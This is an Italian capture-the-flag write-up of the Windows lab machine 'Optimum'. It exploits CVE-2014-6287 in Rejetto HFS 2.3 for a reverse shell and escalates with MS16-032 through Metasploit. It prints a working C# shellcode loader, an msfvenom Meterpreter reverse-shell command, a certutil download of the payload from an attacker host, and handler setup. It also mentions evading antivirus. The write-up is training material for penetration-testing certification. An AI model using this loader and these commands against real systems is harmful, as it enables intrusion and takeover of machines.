+++
date = '2026-06-26T20:20:16+02:00'
draft = false
title = 'Optimum Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`19/01/2026`**

![Optimum.jpeg](/images/imgs_optimum/Optimum.jpeg)

---
# Introduzione

**_Optimum_** è una macchina **Windows** di livello **Easy** che cattura perfettamente l'essenza dei classici box per principianti in stile **eJPT**.

L'exploitation path è molto lineare e si basa sull'identificazione di un file server web obsoleto e vulnerabile. L'accesso iniziale si ottiene sfruttando una nota vulnerabilità di **Remote Command Execution** (**RCE**) in **Rejetto HTTP File Server 2.3**. Per la privilege escalation, dopo alcuni tentativi di enumerazione manuale, sono passato a **Metasploit** e utilizzando il **Local Exploit Suggester** ho potuto notare la mancanza di una patch di Windows, portando a un exploit del kernel che garantisce la totale compromissione del sistema.

---
# Tecniche Utilizzate

- **Remote Code Execution → CVE-2014-6287**
- **Kernel Exploitation → MS16-032**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV -Pn -T5 optimum
```

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Porta Aperta**:
- **80**/tcp - http HttpFileServer httpd 2.3

## HTTP - Enumerazione Web

Il server hostava un'interfaccia web e, guardando il pannello "Server information" nell'angolo in basso a sinistra, ho notato il nome del software esatto e la sua versione: **HttpFileServer 2.3**.

![webpage.png](/images/imgs_optimum/webpage.png)

## searchsploit 

A questo punto ho usato **searchsploit** per cercare vulnerabilità note.

```bash
searchsploit httpfileserver
```

![searchsploit.png](/images/imgs_optimum/searchsploit.png)

La ricerca ha restituito un risultato molto promettente:

- **Rejetto HttpFileServer 2.3.x - Remote Command Execution**.

Questa specifica vulnerabilità è catalogata come **CVE-2014-6287**.

**Nota**: _Questa vulnerabilità si verifica a causa di un difetto nel modo in cui il parser dell'applicazione **HFS** gestisce le macro (in particolare la funzione **`findMacroMarker`**). Inviando una richiesta HTTP appositamente creata contenente un **null byte** (**%00**) all'interno del parametro di ricerca, un attaccante può ingannare il server facendogli vedere l'input malevolo come una macro, portando a una **Remote Command Execution arbitraria**._

---
# Accesso Iniziale | CVE-2014-6287 → RCE

Di norma preferisco un approccio in stile **OSCP**, quindi ho deciso di testare alcuni payload manualmente. Tuttavia, i miei tentativi iniziali di iniettare un payload per una reverse shell non hanno avuto successo.

Per risparmiare tempo, ho cercato su **GitHub** un exploit Python affidabile per la **CVE-2014-6287** e ho trovato questo:
https://github.com/rahisec/rejetto-http-file-server-2.3.x-RCE-exploit-CVE-2014-6287

Ho clonato lo script, configurato il mio listener **netcat** sulla porta 22667 ed eseguito l'exploit.

```bash
python3 exploit.py
```

Ha funzionato e ho ottenuto una reverse shell come utente **kostas**:

![initial_access.png](/images/imgs_optimum/initial_access.png)

Da lì, ho navigato sul Desktop dell'utente e ho preso la **User flag**:

![user_flag.png](/images/imgs_optimum/user_flag.png)

---
# Privilege Escalation | Metasploit & MS16-032

Ottenuto l'accesso iniziale, ho caricato ed eseguito **winPEAS** per cercare vettori rapidi di privilege escalation, ma non ha rivelato particolari vettori di attacco.

Dato che conoscevo già la vulnerabilità esatta usata per l'accesso iniziale, e poiché all'epoca mi stavo preparando attivamente per la certificazione **eJPT**, ho deciso di passare a **Metasploit** per ottenere una shell **Meterpreter** più stabile e sfruttare i suoi moduli di post-exploitation.

Tuttavia, invece di prendere la strada più facile e lanciare il modulo exploit di default **`rejetto_hfs_exec`**, ho deciso di aggiungere un tocco di classe al processo.

![csharp.png](/images/imgs_optimum/csharp.png)

## Sviluppo Malware (Maldev)

Dopo aver controllato alcune informazioni di sistema riguardo la versione dell'OS e la sua architettura tramite la mia sessione attiva:

```bash
systeminfo
```

Ho generato un payload per una reverse shell **Meterpreter** usando **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f csharp > fall.cs
```

e ho incorporato lo shellcode raw in un **loader** customizzato scritto in **C#**:

```cs
using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            byte[] shellCode = new byte[] {/*Raw Bytes Here*/};

            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

**Nota**: _Questo loader in **C#** funziona utilizzando **P/Invoke** per richiamare le API Win32 standard non gestite (unmanaged). Per prima cosa, **`VirtualAlloc`** alloca un blocco di memoria con permessi **`PAGE_EXECUTE_READWRITE`** in modo che al processore sia permesso eseguirlo. Successivamente, **`Marshal.Copy`** scrive i byte raw dello shellcode generato da **msfvenom** in quello spazio di memoria appena allocato. Infine, **`CreateThread`** punta l'esecuzione allo shellcode, e **`WaitForSingleObject`** impedisce al programma principale di chiudersi prematuramente mettendolo in attesa a tempo indeterminato (**0xFFFFFFFF**), assicurando che la mia sessione **Meterpreter** rimanga attiva._

Dopo aver compilato l'eseguibile sulla mia macchina:

```bash
msc shellcode_loader.cs -out:fall.exe
```

L'ho trasferito sull'host target tramite la mia reverse shell attiva:

```bash
# attacker machine
python3 -m http.server

# victim machine
certutil -urlcache -split -f http://10.10.16.77:8000/fall.exe fall.exe
```

A questo punto ho aperto **Metasploit** e ho settato un listener **Meterpreter**:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <attacker_port>
run
```

Una volta eseguito, si è collegato al mio **`multi/handler`**, garantendomi una sessione **Meterpreter** stabile e pienamente funzionante.

![msf_shell.jpeg](/images/imgs_optimum/msf_shell.jpeg)

**Nota**: _Per essere del tutto obiettivi, creare un loader **C#** in questo scenario potrebbe essere considerato eccessivo e in parte una perdita di tempo, specialmente perché conoscevo già la vulnerabilità esatta della quale Metasploit ha già un modulo dedicato. Inoltre, questo codice rappresenta la base assoluta dello **sviluppo malware** in quanto avrei potuto ampiamente migliorarlo implementando **tecniche di offuscamento** e **process injection** (iniettare lo shellcode all'interno di processi Windows legittimi) per **bypassare i moderni AV** come **Windows Defender** e stabilire una persistenza invisibile. Tuttavia, è stato un esercizio molto divertente e istruttivo per testare queste meccaniche fondamentali di **maldev** su una macchina semplice e priva di restrizioni._

Una volta stabilita la sessione **Meterpreter**, l'ho messa in background e ho caricato il **`Local Exploit Suggester`**:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

![exploit_suggester.png](/images/imgs_optimum/exploit_suggester.png)

Il suggester ha analizzato il sistema e identificato diverse potenziali vulnerabilità. Uno degli exploit kernel di Windows più affidabili in quella lista era:

 **MS16-032** (**Secondary Logon Handle Privilege Escalation**):

![ms16_privesc.png](/images/imgs_optimum/ms16_privesc.png)

Ho caricato il modulo suggerito, l'ho configurato per puntare alla mia sessione attiva e l'ho lanciato:

![system_proof](/images/imgs_optimum/system_proof.png)

**NT AUTHORITY\SYSTEM**.

Sul Desktop dell'**Administrator** era presente la **Root flag**:

![root_flag.png](/images/imgs_optimum/root_flag.png)

---
# Conclusioni Finali

**_Optimum_** è un box semplice e rilassante che funge da perfetto scenario per fare pratica per la certificazione **eJPT**.

Evidenzia un workflow molto realistico: enumerare specifiche versioni dei software, trovare exploit pubblici e adattarsi quando l'enumerazione manuale (come **WinPEAS**) non porta a nulla. Sebbene passare a **Metasploit** per sfruttare il **Local Exploit Suggester** sia una tecnica standard e altamente efficace per le macchine Windows più datate, fare quel passo in più per scrivere e compilare un loader **C#** ha reso questo box significativamente più gratificante.

Anche se costruire un dropper custom era obiettivamente esagerato vista la semplicità di questo box, è stata un'ottima occasione per alzare l'asticella e fare pratica con i concetti base di **malware development** in un ambiente senza restrizioni. Spingersi oltre i moduli exploit di base pre-confezionati e costruire payload custom è esattamente ciò che forgia la mentalità necessaria per certificazioni più avanzate.

**Fonti**:

- **Exploit CVE-2014-6287** | https://github.com/rahisec/rejetto-http-file-server-2.3.x-RCE-exploit-CVE-2014-6287